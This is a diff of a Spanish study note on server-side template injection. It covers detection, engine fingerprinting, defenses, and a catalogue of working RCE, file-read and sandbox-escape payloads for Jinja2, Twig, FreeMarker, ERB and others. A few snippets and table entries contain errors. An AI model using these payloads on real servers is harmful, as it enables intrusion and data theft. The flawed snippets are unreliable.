@@ -1,27 +1,202 @@
 ---
-aliases: [SSTI, Inyección de Plantillas del Lado del Servidor]
-tags: [hacking/explotacion, hacking/web, hacking/laboratorios, herramientas/burpsuite, hacking/herramientas, programacion/python, redes/conceptos]
-estado: 🟢 Terminado
+aliases:
+  - SSTI
+  - Inyección de Plantillas del Lado del Servidor
+tags:
+  - sec/web
+  - sec/web/ssti
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Client-Side Template Injection (CSTI)]]"
+  - "[[OS Command Injection]]"
+  - "[[Ataques de Deserialización]]"
+  - "[[Cross-Site Scripting XSS]]"
+  - "[[Prototype Pollution]]"
+fuente: "https://portswigger.net/web-security/server-side-template-injection"
 ---
 # Server-Side Template Injection (SSTI)
 
-El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.
+El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad en la que el atacante **inyecta expresiones en una plantilla que el servidor evalúa**, logrando que el motor de plantillas ejecute su código — hasta RCE completa. Es una inyección de *lenguaje de plantilla* (Jinja2, Twig, FreeMarker, ERB…), no de HTML ni de comandos: la app confunde **datos** con **código de plantilla**.
 
 > [!info] ¿Qué es una plantilla de servidor?
-> Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Permiten separar la lógica de negocio de la presentación, facilitando el desarrollo y mantenimiento. Ejemplos comunes incluyen Jinja2 (Python), Twig (PHP), ERB (Ruby), FreeMarker (Java), y Handlebars (JavaScript).
+> Las plantillas son archivos con marcado mixto (HTML + expresiones) que el motor procesa para generar contenido dinámico: separan presentación de lógica. Ejemplos: Jinja2 (Python/Flask), Twig (PHP/Symfony), FreeMarker (Java), ERB (Ruby), Handlebars (Node), Tornado (Python), Django Templates. El motor sustituye `{{ expr }}` por el **valor** de `expr` — SSTI ocurre cuando `expr` es controlada por el atacante y el motor la **interpreta** en vez de tratarla como texto.
 
-Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.
+En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb** (ver [[WhatWeb Herramienta de Fingerprinting|WhatWeb]]). Si la app usa Flask, usará **Jinja2**, con payloads y rutas de escape propias. Django, por otro lado, usa un motor expresivo limitado por defecto donde la explotación requiere contextos especiales.
 
-Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.
+## Mecánica: cuándo un input llega a evaluarse
 
-En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.
+El bug nace de patrones como:
 
-> [!tip] Jinja2 y su Sandbox
-> Jinja2, como muchos motores de plantillas, implementa un *sandbox* para limitar las operaciones que se pueden realizar. Sin embargo, existen técnicas conocidas para evadir este sandbox, a menudo explotando la forma en que Python maneja los objetos y sus atributos (`__class__`, `__base__`, `__subclasses__`, `__globals__`).
+```python
+# VULNERABLE: el usuario controla parte de la CADENA de plantilla
+render_template_string("Hola " + request.args.get("nombre"))
 
-Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes *frameworks* de plantillas, como Django, Ruby on Rails, entre otros.
+# También vulnerable: plantilla dinámica con include/extends controlado
+render_template(request.args.get("page") + ".html")
+```
 
-Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y *frameworks* de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.
+```php
+// VULNERABLE (Twig)
+echo $twig->createTemplate("Bienvenido " . $_GET['nombre'])->render($ctx);
+```
+
+**No es SSTI** (aunque parezca) renderizar datos dentro de una plantilla fija: `{{ usuario.nombre }}` con `nombre = "{{7*7}}"` imprime el string literal (eso sería [[Client-Side Template Injection (CSTI)|CSTI]] si el render es del lado cliente). La diferencia clave: en SSTI el input se convierte **parte del código de la plantilla** antes del parseo.
+
+### Detección: fingerprints por motor
+
+La prueba canónica es inyectar matemática y ver si devuelve el **resultado** (evaluación) en vez del string:
+
+| Payload | Jinja2 / Twig / Tornado | FreeMarker / Velocity | ERB (Ruby) | Pug/Jade | Smarty (PHP) |
+|---|---|---|---|---|---|
+| `{{7*7}}` | `49` | `49` (FreeMarker: `${7*7}`) | — | `49` | `49` |
+| `<%= 7*7 %>` | — | — | `49` | — | — |
+| `${7*7}` | — | `49` | — | — | — |
+| `#{7*7}` | — | `49` (Velocity) | — | — | — |
+| `*{7*7}` | — | — | — | — | `49` (Smarty) |
+| `{{constructor.constructor('return 7*7')()}}` | `49` (JS engines) | — | — | — | — |
+| `{{7*'7'}}` | `49` (Jinja2: 7 strings "7" → `7777777`… ver abajo) | FreeMarker: error | — | — | — |
+
+> [!tip] El desempate `{{7*'7'}}`
+> - **Jinja2**: `7 * '7'` = `7777777` (replicación de string).
+> - **Twig**: `7 * '7'` = `49` (cast a número).
+> - **PHP plano**: no evalúa nada.
+> - **FreeMarker**: error de tipo.
+> Un solo payload distingue en una petición los tres motores más comunes.
+
+### Identificación por mensajes de error
+
+Provocar errores deliberados (atributo inexistente, `;`, comillas rotas) revela el motor y el lenguaje:
+
+| Error observado | Motor / stack |
+|---|---|
+| `jinja2.exceptions.UndefinedError` / rutas Python | Jinja2 (Flask) |
+| `Twig\\Error\\SyntaxError` / rutas PHP | Twig (Symfony) |
+| `freemarker.core._TemplateException` / `FreeMarker Template` | FreeMarker (Java) |
+| `Tornado` en stacktrace | Tornado (Python) |
+| `ActionView::Template` / rutas Ruby | ERB (Rails) |
+| `Handlebars` / `mustache` | Handlebars/JS |
+| `django.template` | Django Templates |
+
+El error también puede venir de la **firma del objeto** inyectado: `user.nickname` extendido con sintaxis ajena produce el error con el nombre del motor — el laboratorio "code context" de PortSwigger se resuelve exactamente así.
+
+## Catálogo de payloads por motor
+
+### Jinja2 (Python / Flask / FastAPI)
+
+| Objetivo | Payload |
+|---|---|
+| Prueba | `{{7*7}}`, `{{config}}`, `{{self}}`, `{{request}}` |
+| Fuga de config | `{{config.items()}}`, `{{config['SECRET_KEY']}}` |
+| Lea de archivos | `{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}` |
+| RCE vía Popen | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
+| RCE vía joiner/glob | `{{ lipsum.__globals__['os'].popen('id').read() }}` |
+| RCE vía request | `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}` |
+| Lista de subclasses → gadget | `{{ ''.__class__.__mro__[1].__subclasses__() }}` (buscar `Popen`, `warnings.catch_warnings`, `linecache`) |
+| Sandbox escape clásico | `{{ (lipsum|attr('__globals__'))['os']|attr('popen')('id')|attr('read')() }}` |
+
+Ruta canónica de escape Jinja2: `obj → __class__ → __base__/__mro__ → __subclasses__ → gadget (Popen / catch_warnings→__builtins__.__import__('os')) → popen → read`.
+
+### Twig (PHP / Symfony)
+
+| Objetivo | Payload |
+|---|---|
+| Prueba | `{{7*7}}`, `{{_self}}`, `{{_self.env}}` |
+| RCE (Twig < 2.x / sin sandbox) | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` |
+| RCE alternativo | `{{['id']|filter('system')}}` (Twig 2.x/3.x) |
+| Lectura ficheros | `{{ ['cat /etc/passwd']|filter('system') }}` |
+
+### FreeMarker (Java)
+
+| Objetivo | Payload |
+|---|---|
+| Prueba | `${7*7}`, `<#assign ex="freemarker.template.utility.Execute">` |
+| RCE | `<#assign ex="freemarker.template.utility.Execute"> ${ex("id")}` |
+| Nuevo (2.3.30+) | `${"freemarker.template.utility.Execute"?new()("id")}` |
+| Sandbox escape | `<#assign classloader=object?api.class.protectionDomain.classLoader> ...` |
+
+### ERB (Ruby / Rails)
+
+```erb
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').reads %>
+```
+
+### Otros motores
+
+| Motor | Prueba | RCE / impacto |
+|---|---|---|
+| **Tornado** (Python) | `{{7*7}}` | `{{handler.settings}}`, módulos importables en contexto |
+| **Handlebars** (Node) | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...` | RCE documentado en PayloadsAllTheThings |
+| **Pug** (Node) | `#{7*7}` | `- var cp = global.process.mainModule.require('child_process'); - cp.execSync('id')` |
+| **Smarty** (PHP) | `{7*7}` | `{php}system('id'){/php}` (legacy), `{system('id')}` |
+| **Mako** (Python) | `${7*7}` | `<% import os; x=os.popen('id').read() %>` |
+| **Django Templates** | `{{7*7}}` (no evalúa aritmética) | Limitado; útil vía objetos expuestos (`{{request.user}}`) y debug info leak |
+
+> [!warning] Escapes de sandbox
+> Los sandboxes de plantillas (Jinja2 `SandboxedEnvironment`, FreeMarker sandbox, Twig sandbox) restringen atributos peligrosos, pero históricamente se han evadido encadenando objetos permitidos (`lipsum`, `cycler`, `joiner`, `request`, `config`) hasta un gadget de ejecución. Mantener el sandbox actualizado y **añadir allowlist de atributos** — ver defenses abajo.
+
+## Metodología de explotación
+
+1. **Descubrir entrada evaluable**: cualquier reflejo de input (nombres, emails, plantillas de notificación, previews de documento, campos "personaliza tu firma"). Probar `{{7*7}}`, `<%= 7*7 %>`, `${7*7}`, `#{7*7}` en todos los parámetros.
+2. **Confirmar evaluación**: el servidor devuelve `49`, no el string.
+3. **Identificar motor**: combinar los desempates (`{{7*'7'}}`, `${7*7}`), provocar errores deliberados, fingerprint de headers/tecnologías (WhatWeb, errores 500).
+4. **Contexto**: ¿la inyección está en medio de una expresión ("code context"), en un campo plano, o en include/extends? En code context, cerrar la expresión anterior: `{{user.nickname}}` → `}}{{7*7}}` para terminar la etiqueta ajena y abrir la propia.
+5. **Escalar**: primero fuga de config (`SECRET_KEY`, credenciales en `config`), luego lectura de ficheros, luego RCE con el payload del motor.
+6. **Sandbox**: si los payloads directos fallan, probar gadgets alternativos (`__subclasses__`, `attr` filter, `?api`) y payloads "custom exploit" (encadenar con subida de ficheros, como el lab con Twig + avatar_upload).
+7. **URL-encoding**: los payloads con espacios/comillas en GET deben ir URL-encoded (Burp lo gestiona con *URL-encode as necessary*).
+
+## SSTI → RCE y cadenas
+
+| Cadena | Descripción |
+|---|---|
+| SSTI directa | `popen('id')` → reverse shell |
+| SSTI → lectura de secretos | `config['SECRET_KEY']` → falsificar tokens/sesiones |
+| SSTI → file write/abuse | Leer código fuente para encontrar otra vuln (el lab "custom exploit": SSTI + abuso de `setAvatar()` para borrar `~/.ssh/authorized_keys`) |
+| SSTI → [[Ataques de Deserialización]] | Gadget chains accesibles desde el contexto de plantilla |
+| SSTI → [[OS Command Injection]] | El motor invoca comandos con input parcialmente controlado |
+
+## Defensa (con código)
+
+```python
+# VULNERABLE
+@app.route("/hello")
+@app.render_template_string("<h1>Hola " + request.args.get("name", "") + "</h1>")
+
+# SEGURO 1: datos NUNCA en la cadena de plantilla — siempre como variable
+@app.route("/hello")
+def hello():
+    return render_template_string("<h1>Hola {{ name }}</h1>",
+                                  name=request.args.get("name", ""))
+
+# SEGURO 2: si hay que evaluar plantillas dinámicas, sandbox + allowlist
+from jinja2.sandbox import SandboxedEnvironment
+from jinja2 import Environment
+env = SandboxedEnvironment()          # bloquea os, eval, __builtins__ directos
+# reforzar: deshabilitar atributos/interceptores peligrosos y actualizar el motor
+
+# SEGURO 3: para contenido "personalizable", usar lenguaje limitado, no plantillas
+# (markdown/plantillas con placeholders fijos, nunca eval)
+```
+
+```php
+// SEGURO (Twig): datos como contexto, jamás concatenados en createTemplate
+$twig->createTemplate("Bienvenido {{ nombre }}")
+     ->render(['nombre' => $entrada]);   // Twig escapa y NO evalúa el valor
+```
+
+Reglas duras:
+1. **Nunca** concatenar input del usuario dentro de la cadena de plantilla.
+2. Si el usuario debe "personalizar", usar **variables de plantilla**, no plantillas dinámicas.
+3. Sandbox obligatorio donde haya render dinámico, con motor actualizado.
+4. El proceso del servidor web sin privilegios, sin salida a red innecesaria (reduce el valor de la RCE).
+5. No exponer `config`, `request`, `self` en contextos de plantilla accesibles a usuarios.
+
+> [!tip] PayloadsAllTheThings
+> Este repositorio es una referencia invaluable para *testers* de seguridad, ya que compila una vasta colección de *payloads* para diversas vulnerabilidades, incluyendo SSTI, XSS, SQLi, etc., organizado por tipo de vulnerabilidad y tecnología: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 
 ## Notas de la práctica
 
@@ -419,3 +594,51 @@ Al parecer, ese es el contenido. Vemos si al invocar a la función que encontram
 ![[Pasted image 20250923103034.png]]
 
 Lab Terminada.
+
+## Errores comunes
+
+**Del atacante:**
+1. Tratar `{{7*7}}` sin confirmar si el input es *parte de la plantilla* o un dato renderizado: un literal impreso no es SSTI (puede ser CSTI o nada).
+2. No probar todas las sintaxis (`<%=`, `${`, `#{`, `*{`): el motor puede no ser Jinja2.
+3. Saltarse el code context: en `{{user.nickname}}` inyectar sin cerrar la etiqueta ajena rompe el parseo — primero cerrar, luego abrir.
+4. Copiar payloads de un motor a otro sin identificar el stack: Twig no entiende Jinja2 y viceversa.
+5. Con sandbox, rendirse tras un payload fallido: probar la lista alternativa de gadgets (`lipsum`, `cycler`, `joiner`, `namespace`, `request`).
+6. Olvidar URL-encoding en payloads con espacios/comillas — errores falsos de "no vulnerable".
+
+**Del defensor:**
+1. Concatenar input en `render_template_string` / `createTemplate`: la causa raíz #1.
+2. Creer que escapar HTML evita SSTI: el escape aplica a la salida, la inyección ocurre **antes**, en el parseo.
+3. Dejar el sandbox desactualizado o sin allowlist: los escapes de sandbox evolucionan con cada versión.
+4. Exponer `config`, `request`, `self` o `app` en contextos accesibles a plantillas de usuario: reduce el trabajo del atacante a leer secretos sin RCE.
+5. Habilitar plantillas dinámicas (`extends`/`include` con input) "solo para temas": es SSTI por diseño.
+
+## Cheatsheet
+
+| Paso | Payload / acción |
+|---|---|
+| Prueba universal | `{{7*7}}`, `<%= 7*7 %>`, `${7*7}`, `#{7*7}` |
+| Desempate motor | `{{7*'7'}}` → Jinja2 `7777777` / Twig `49` |
+| Error fingerprint | Inyectar `;` o atributo inválido → leer stacktrace |
+| Jinja2 RCE | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
+| Jinja2 secretos | `{{config['SECRET_KEY']}}` |
+| Twig RCE | `{{['id']|filter('system')}}` |
+| FreeMarker RCE | `<#assign ex="freemarker.template.utility.Execute">${ex("id")}` |
+| ERB RCE | `<%= `id` %>` |
+| Defensa | Datos como variables, nunca en la cadena; sandbox + allowlist |
+
+## Laboratorios y referencias
+
+- **PortSwigger Academy — SSTI**: https://portswigger.net/web-security/server-side-template-injection (los 7 labs resueltos en esta nota)
+- **PayloadsAllTheThings — SSTI**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+- **HackTricks — SSTI**: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection.html
+- Playground propio: `docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground`
+- Notas internas: [[Client-Side Template Injection (CSTI)]], [[OS Command Injection]]
+
+## Relacionadas
+
+- [[Client-Side Template Injection (CSTI)]] — la cara cliente del mismo malentendido (Angular/JS)
+- [[OS Command Injection]] — impacto equivalente, superficie distinta
+- [[Ataques de Deserialización]] — gadget chains colindantes con los sandboxes de plantillas
+- [[Cross-Site Scripting XSS]] — cómo se diferencia: SSTI evalúa en el servidor, XSS en el navegador
+- [[Prototype Pollution]] — otro lenguaje "confundido con datos" en stacks JS
+- [[Abuso de Subida de Archivos]] — el eslabón del lab "custom exploit" (Twig + avatar upload)
